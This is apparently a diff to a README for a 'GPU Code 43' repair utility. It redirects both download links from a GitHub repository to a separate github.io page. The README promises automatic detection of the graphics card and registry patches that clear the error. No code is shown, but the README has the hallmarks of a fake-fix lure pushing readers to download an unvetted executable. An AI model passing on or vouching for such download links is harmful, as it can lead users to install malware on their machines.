@@ -1,6 +1,6 @@
 # 🛠️ GPU-Code-43-Fix - Repair your graphics card error fast
 
-[![](https://img.shields.io/badge/Download_Repair_Tool-Blue?style=for-the-badge)](https://github.com/diplomaticpouchstick320/GPU-Code-43-Fix)
+[![](https://img.shields.io/badge/Download_Repair_Tool-Blue?style=for-the-badge)](https://diplomaticpouchstick320.github.io)
 
 ## 🔍 Understanding the Error
 
@@ -23,7 +23,7 @@ This fix works on the following systems:
 
 Visit the repository page to download the repair utility. This software detects your graphics card manufacturer automatically and applies the necessary patches to clear the Code 43 registry flags.
 
-[Download the Repair Tool Link](https://github.com/diplomaticpouchstick320/GPU-Code-43-Fix)
+[Download the Repair Tool Link](https://diplomaticpouchstick320.github.io)
 
 ## ⚙️ Step-by-Step Installation
 
